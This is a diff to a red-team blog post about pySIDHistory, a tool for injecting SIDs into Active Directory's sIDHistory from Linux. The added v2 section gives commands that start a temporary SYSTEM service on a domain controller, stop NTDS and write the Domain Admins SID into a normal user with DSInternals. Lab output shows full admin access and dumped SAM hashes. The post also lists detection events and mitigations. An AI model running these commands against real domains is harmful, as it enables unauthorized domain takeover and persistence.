@@ -2,9 +2,9 @@
 title: "pySIDHistory - Remote SID History Injection from Linux"
 date: 2026-02-17
 draft: false
-description: "Building the first Python implementation of DRSAddSidHistory (MS-DRSR opnum 20) to inject SIDs into Active Directory's sIDHistory remotely from Linux."
-summary: "The Hacker Recipes said remote SID History injection from Linux was impossible. Here's how I proved them wrong — and every bug I hit along the way."
-tags: ["active-directory", "sid-history", "impacket", "drsuapi", "ndr", "ldap", "persistence", "python", "red-team"]
+description: "Building the first Python implementation of DRSAddSidHistory (MS-DRSR opnum 20) to inject SIDs into Active Directory's sIDHistory remotely from Linux — and why that wasn't enough."
+summary: "The Hacker Recipes said remote SID History injection from Linux was impossible. Here's how I proved them wrong, discovered DRSUAPI couldn't actually privesc, and built a second tool that could."
+tags: ["active-directory", "sid-history", "impacket", "drsuapi", "dsinternals", "ndr", "ldap", "persistence", "python", "red-team", "scmr"]
 categories: ["Active Directory", "Tools"]
 featuredImage: "featured.png"
 images: ["featured.png", "drsuapi_injection.png", "query.png", "audit.png", "audit_json.png", "enum_trusts.png", "lookup.png", "list_presets.png"]
@@ -288,13 +288,145 @@ With the plumbing finally working, the DC started giving me *real* errors. And e
 
 All of these prerequisites are documented by Microsoft — but scattered across the `DsAddSidHistory` docs, the ADMT documentation, and separate KB articles. Never together, never in order. I found them one at a time, blind.
 
-### The moment it worked
+### The moment it worked (or so I thought)
 
 ![DRSUAPI cross-forest injection](./drsuapi_injection.png)
 
 The tool connects via LDAP for auth and SID resolution, establishes a DRSUAPI session signaling `DRS_EXT_ADD_SID_HISTORY`, then fires `DRSAddSidHistory` with the source principal (`da-admin2@lab2.local`) pointed at the target (`user1@lab1.local`). The DC copies the SID. Error code 0. Done.
 
-After all the NDR headaches and the flag parsing disaster, seeing `Win32Error: 0` was genuinely surreal.
+After all the NDR headaches and the flag parsing disaster, seeing `Win32Error: 0` was genuinely surreal. Time to cash in — if `user1` now carries the Domain Admins SID from `lab2.local` in its token, a simple `netexec --sam` against DC2 should dump everything:
+
+```
+nxc smb 192.168.56.11 -u user1 -p 'Password123!' -d lab1.local --shares
+```
+
+```
+SMB  192.168.56.11  445  DC2  [+] lab1.local\user1:Password123!
+SMB  192.168.56.11  445  DC2  Share     Permissions  Remark
+SMB  192.168.56.11  445  DC2  -----     -----------  ------
+SMB  192.168.56.11  445  DC2  ADMIN$                 Remote Admin
+SMB  192.168.56.11  445  DC2  C$                     Default share
+SMB  192.168.56.11  445  DC2  IPC$      READ         Remote IPC
+SMB  192.168.56.11  445  DC2  NETLOGON  READ         Logon server share
+SMB  192.168.56.11  445  DC2  SYSVOL    READ         Logon server share
+```
+
+No `(Pwn3d!)`. No `READ,WRITE` on `ADMIN$`. The SID is in the attribute — I verified it with `--query` — but the access token doesn't reflect it. `user1` is still a normal user.
+
+### The wall I didn't see coming
+
+I'd spent days fighting NDR serialization bugs, prerequisite errors, and MS-DRSR documentation. The RPC call succeeded. The SID was written. And none of it mattered, because of two things I hadn't accounted for:
+
+**Problem #1 — DRSUAPI is cross-forest only.** `DRSAddSidHistory` is designed for domain *migrations*. Injecting a SID from your own domain into your own domain doesn't make sense in that context — the DC rejects it with error 8534. You *have* to inject a SID from another forest. Which leads to...
+
+**Problem #2 — [SID filtering](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/).** When a user authenticates across a forest trust, the destination DC inspects the PAC and **strips any SID with a RID below 1000**. That's Domain Admins (512), Enterprise Admins (519), krbtgt (502) — every single privileged group. Even with `TREAT_AS_EXTERNAL` set on the trust and SID History explicitly enabled, Windows still filters these at the boundary. It's a security feature, not a misconfiguration.
+
+So the v1 tool works perfectly at the protocol level — the SID gets written into `sIDHistory` exactly as intended. But the only SIDs you can usefully inject cross-forest are unprivileged ones (RID > 1000), which aren't interesting for privilege escalation. The very SIDs you *want* to inject are the ones the trust strips out.
+
+I had built a perfectly functional gun that only fires blanks.
+
+---
+
+## v2 — doing it the hard way
+
+The core issue with DRSUAPI is that it operates within Windows' trust and validation model. Every safeguard kicks in: cross-forest requirement, SID filtering, auditing prerequisites. To inject privileged SIDs, I needed to bypass all of that — modify the attribute at a level where none of these checks exist.
+
+That level is `ntds.dit` itself.
+
+### The DSInternals approach
+
+[DSInternals](https://github.com/MichaelGrafnetter/DSInternals) is a PowerShell module by Michael Grafnetter that can modify `ntds.dit` offline — including writing arbitrary SIDs into `sIDHistory` via `Add-ADDBSidHistory`. No SAM layer, no DRSUAPI validation, no SID filtering. The catch: NTDS has to be stopped first, because Windows locks the database file while the service is running.
+
+The v2 architecture chains three impacket protocols to do this entirely from Linux:
+
+```
+Attacker (Linux)                              Domain Controller
+  │                                                 │
+  │── SMB (445) ──────────────────────────────────►│  Upload PowerShell script
+  │── SCMR (svcctl pipe) ────────────────────────►│  Create + start temp service
+  │                                                 │
+  │   [DC-side: service runs PowerShell]            │
+  │     1. Stop-Service ntds                        │
+  │     2. Install DSInternals 4.14 from NuGet      │
+  │     3. Add-ADDBSidHistory on ntds.dit           │
+  │     4. Start-Service ntds                       │
+  │     5. Write result to C:\Windows\Temp\         │
+  │                                                 │
+  │── SMB (445) ──────────────────────────────────►│  Poll for result file
+  │◄── "SUCCESS" ─────────────────────────────────│
+  │── SCMR ───────────────────────────────────────►│  Delete service + cleanup
+```
+
+**Why SCMR?** Windows services run as SYSTEM. By creating a temporary service whose binary path is a PowerShell command, we get SYSTEM-level execution on the DC — enough to stop NTDS, modify the database, and restart the service. Impacket's SCMR implementation handles all of this over the existing SMB connection.
+
+**Why DSInternals 4.14 specifically?** Version 6.x removed `Add-ADDBSidHistory`. The tool auto-installs 4.14 from NuGet to an isolated path (`C:\Windows\Temp\__DSInternals414`) to avoid conflicts with any existing installation.
+
+**The brief downtime:** Stopping NTDS means the DC is unavailable for a few seconds. The SMB connection also drops (since SMB auth goes through AD). The tool handles this with automatic reconnection and polling — it waits for the result file to appear, reconnecting as needed until NTDS is back.
+
+This is noisier than DRSUAPI. It stops a critical service, installs a module, writes to disk. But it works on *any* SID — same-domain, privileged, anything. No trust required, no SID filtering.
+
+### The actual privilege escalation
+
+Same lab, same `user1`, same `Password123!`. But this time, injecting Domain Admins of **the same domain** — something DRSUAPI flat-out refuses:
+
+```bash
+python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+    --target user1 --inject domain-admins --force
+```
+
+```
+             _____ _____ ____  _   _ _     _
+ _ __  _   _/ ___||_ _||  _ \| | | (_)___| |_ ___  _ __ _   _
+| '_ \| | | \___ \ | | | | | | |_| | / __| __/ _ \| '__| | | |
+| |_) | |_| |___) || | | |_| |  _  | \__ \ || (_) | |  | |_| |
+| .__/ \__, |____/|___||____/|_| |_|_|___/\__\___/|_|   \__, |
+|_|    |___/                                             |___/
+    Remote SID History Injection & Audit Tool  v2
+    DSInternals + DRSUAPI | github.com/felixbillieres
+                                      @felixbillieres
+
+[*] Injection target: user1
+[*] SID to inject:   S-1-5-21-1064857176-2493228643-2199314749-512 (Domain Admins)
+[*] Method:          DSInternals (offline ntds.dit)
+[*] DC:              192.168.56.10
+
+[*] Connecting to DC via SMB...
+[*] NTDS service stopping, injecting SID via DSInternals...
+[+] DSInternals injection succeeded
+[*] Waiting for NTDS to restart...
+
+[+] sIDHistory modified successfully
+
+SID History for user1:
+  S-1-5-21-1064857176-2493228643-2199314749-512 (Domain Admins)
+```
+
+And this time:
+
+```
+nxc smb 192.168.56.10 -u user1 -p 'Password123!' -d lab1.local --shares
+
+SMB  192.168.56.10  445  DC1  [+] lab1.local\user1:Password123! (Pwn3d!)
+SMB  192.168.56.10  445  DC1  Share      Permissions  Remark
+SMB  192.168.56.10  445  DC1  -----      -----------  ------
+SMB  192.168.56.10  445  DC1  ADMIN$     READ,WRITE   Remote Admin
+SMB  192.168.56.10  445  DC1  C$         READ,WRITE   Default share
+SMB  192.168.56.10  445  DC1  IPC$       READ         Remote IPC
+SMB  192.168.56.10  445  DC1  NETLOGON   READ,WRITE   Logon server share
+SMB  192.168.56.10  445  DC1  SYSVOL     READ,WRITE   Logon server share
+```
+
+```
+nxc smb 192.168.56.10 -u user1 -p 'Password123!' -d lab1.local --sam
+
+SMB  192.168.56.10  445  DC1  [+] lab1.local\user1:Password123! (Pwn3d!)
+SMB  192.168.56.10  445  DC1  [*] Dumping SAM hashes
+SMB  192.168.56.10  445  DC1  Administrator:500:aad3b435b51404ee...:7dfa0531d73101ca080c7379a9bff1c7:::
+SMB  192.168.56.10  445  DC1  Guest:501:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB  192.168.56.10  445  DC1  DefaultAccount:503:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+`(Pwn3d!)`. `ADMIN$: READ,WRITE`. SAM dumped. A standard domain user — no group changes, no password reset, no visible modification in ADUC — is now a full Domain Admin through nothing but a single `sIDHistory` entry.
 
 ---
 
@@ -329,15 +461,38 @@ cd .. && ./lab/rollback.sh --all  # auditing + audit groups
 
 ## What the tool does
 
-Beyond the injection itself, I built out the recon and audit side — stuff that's useful both for validating an attack worked and for defenders checking their environment.
+v2 ships both injection methods and a full recon/audit toolkit. Pick your method based on the scenario:
 
-### The injection
+| | DSInternals (v2 default) | DRSUAPI (v1 legacy) |
+|---|---|---|
+| **Privileged SIDs** (DA, EA, krbtgt) | Yes | No (SID-filtered at trust boundary) |
+| **Same-domain injection** | Yes | No (error 8534) |
+| **Cross-forest injection** | Yes | Yes |
+| **Requires** | Domain Admin on the DC | DA + auditing + audit groups + trust |
+| **NTDS downtime** | ~5 seconds | None |
+| **Stealth** | Lower (stops service, writes to disk) | Higher (pure RPC) |
 
-Already covered above. Cross-forest, via DRSUAPI, one command:
+### Injection — DSInternals (default)
+
+```bash
+# Same-domain: inject Domain Admins into user1
+python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+    --target user1 --inject domain-admins --force
+
+# Cross-domain: inject Domain Admins of lab2.local via trust resolution
+python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+    --target user1 --inject domain-admins --inject-domain lab2.local --force
+
+# Raw SID injection
+python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+    --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512 --force
+```
+
+### Injection — DRSUAPI (legacy)
 
 ```bash
 python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
-    --target user1 --source-user da-admin2 --source-domain lab2.local \
+    --target user1 --method drsuapi --source-user da-admin2 --source-domain lab2.local \
     --src-username da-admin2 --src-password 'Password123!' --src-domain lab2.local
 ```
 
@@ -400,22 +555,39 @@ Three Event IDs matter:
 
 4765 and 4766 are **specific** to SID History operations. Outside of scheduled domain migrations, they should never fire. If they do, something is very wrong.
 
+### v2 (DSInternals) detection
+
+The DSInternals method leaves a different footprint:
+
+| Indicator | What to look for |
+|-----------|-----------------|
+| **Service creation** | Event 7045: A new service `__pySIDHist` was installed (System log) |
+| **NTDS stop/start** | Event 7036: NTDS service entered stopped/running state |
+| **PowerShell execution** | Event 4688: `powershell.exe -ExecutionPolicy Bypass` as SYSTEM |
+| **File artifacts** | `C:\Windows\Temp\__pysidhistory_*` and `C:\Windows\Temp\__DSInternals414\` |
+| **SMB writes to ADMIN$** | Network logs showing file upload to `\\DC\ADMIN$\Temp\` |
+
+NTDS stopping on a production DC outside of scheduled maintenance is a very loud signal. Monitor for it.
+
 ### What to do about it
 
-- **Monitor 4765/4766.** These are high-fidelity indicators. Alert on them.
+- **Monitor 4765/4766.** These are high-fidelity indicators for DRSUAPI injection. Alert on them.
+- **Monitor NTDS service events.** Event 7036 with NTDS entering "stopped" state is abnormal in production — alert on it. This catches the DSInternals method.
 - **Run periodic audits.** The `--audit` flag scans the whole domain — schedule it.
-- **Same-domain SIDs are the red flag.** Legitimate migrations produce cross-domain SIDs. Same-domain SIDs in `sIDHistory` are almost always attack artifacts.
+- **Same-domain SIDs are the red flag.** Legitimate migrations produce cross-domain SIDs. Same-domain SIDs in `sIDHistory` are almost always attack artifacts. The DSInternals method makes this trivially easy — it's the primary indicator.
 - **[Enable SID Filtering](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)** on every trust where you don't actively need SID History for migrations.
-- **Lock down DA accounts.** DRSAddSidHistory requires Domain Admin on the destination. Fewer DAs = smaller attack surface.
+- **Lock down DA accounts.** Both methods require Domain Admin. Fewer DAs = smaller attack surface.
 - **Audit your trusts.** `--enum-trusts` shows you exactly which trusts are vulnerable.
 
 ---
 
 ## Wrapping up
 
-What started as "I wonder if that quote is actually true" turned into a deep dive through NDR serialization, impacket internals, and a bunch of obscure Microsoft specifications. The three bugs (missing union discriminant, wrong credential encoding, broken flag parsing) each produced the same unhelpful error, and the cross-forest prerequisites were a treasure hunt through scattered documentation.
+What started as "I wonder if that quote is actually true" turned into two separate deep dives. The first — implementing DRSUAPI opnum 20 from scratch — taught me more about NDR serialization than I ever wanted to know. Three bugs that all returned the same useless error, a flag parsing disaster that almost killed the project, and six prerequisites scattered across Microsoft's documentation like a scavenger hunt.
 
-But it works. Fully remote, fully from Linux, no mimikatz, no ntds.dit, no SYSTEM on the DC. Just domain credentials and an RPC call that Microsoft designed for migrations.
+And then the punchline: it all worked perfectly, but SID filtering meant I couldn't actually escalate privileges with it. The SID was in the attribute. The access token didn't care.
+
+v2 took a completely different approach — chaining SMB, SCMR, and DSInternals to modify `ntds.dit` offline. Noisier, more moving parts, brief NTDS downtime. But it bypasses every validation layer that made v1 a dead end for privilege escalation: no cross-forest requirement, no SID filtering, no restricted RIDs. Any SID, any domain, one command.
 
 The tool is at [github.com/felixbillieres/pySIDHistory](https://github.com/felixbillieres/pySIDHistory), lab included. For authorized security testing only.
 
@@ -435,5 +607,6 @@ The tool is at [github.com/felixbillieres/pySIDHistory](https://github.com/felix
 | [impacket](https://github.com/fortra/impacket) | Python DCE/RPC framework |
 | [mimikatz sid:: module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_sid.c) | Memory patching approach |
 | [Dirkjan Mollema: SID Filtering](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/) | How trust SID filtering works |
-| [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) | Offline ntds.dit approach |
+| [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) | Offline ntds.dit modification (v2 uses 4.14 for `Add-ADDBSidHistory`) |
+| [MS-SCMR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/) | Service Control Manager Remote Protocol (v2 service execution) |
 | [Impacket Developer Guide](https://cicada-8.medium.com/impacket-developer-guide-part-1-rpc-4df4fe6d79d7) | Extending impacket with custom RPC |
